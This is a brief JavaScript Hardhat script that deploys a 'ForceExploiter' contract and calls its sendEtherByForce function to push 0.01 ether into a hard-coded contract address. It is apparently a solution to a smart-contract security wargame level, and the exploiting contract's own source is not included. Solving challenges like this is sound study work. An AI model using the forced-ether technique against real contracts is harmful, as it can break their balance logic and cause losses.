async function main() {
    // We get the contract to deploy
    const ForceExploiter = await ethers.getContractFactory("ForceExploiter");
    const forceExploiter = await ForceExploiter.deploy();

    console.log("ForceExploiter deployed to:", forceExploiter.address);
    await forceExploiter.sendEtherByForce("0xdC3f43FeE42a754fcb1A9350B1206d053b7fC976", { value: ethers.utils.parseEther('0.01') });
}

main()
    .then(() => process.exit(0))
    .catch(error => {
        console.error(error);
        process.exit(1);
    });
